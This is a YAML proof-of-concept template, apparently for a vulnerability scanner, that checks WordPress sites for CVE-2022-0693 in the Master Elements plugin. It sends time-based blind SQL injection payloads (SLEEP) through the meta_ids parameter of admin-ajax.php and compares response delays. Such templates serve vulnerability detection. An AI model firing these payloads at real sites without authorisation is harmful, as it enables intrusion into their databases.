name: yaml-poc-devbunch-master_elements-sql_injection-CVE-2022-0693
binding: 05659a6d-e741-4278-a056-37b3cc166d1f
detail:
    author: jiapeng.han
    links:
        - https://cxsecurity.com/cveshow/CVE-2022-0693/
        - https://nvd.nist.gov/vuln/detail/CVE-2022-0693
        - https://wpscan.com/vulnerability/a72bf075-fd4b-4aa5-b4a4-5f62a0620643
    vulnerability:
        id: 9a7a6d2b-8767-4ebb-a7bf-9589a8417de1
        level: critical
    warning: Harmless
transport: http
set:
    sleepSecond: randomInt(4, 6)
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /wp-admin/admin-ajax.php?meta_ids=1)%20AND%20(SELECT%2042%20FROM%20(SELECT(SLEEP(0)))b&action=remove_post_meta_condition
        expression: response.status == 200
        output:
            r0latency: response.latency
    r1:
        request:
            cache: true
            method: GET
            path: /wp-admin/admin-ajax.php?meta_ids=1)%20AND%20(SELECT%2042%20FROM%20(SELECT(SLEEP({{sleepSecond}})))b&action=remove_post_meta_condition
        expression: response.latency - r0latency >= sleepSecond * 1000 - 500
expression: r0() && r1()
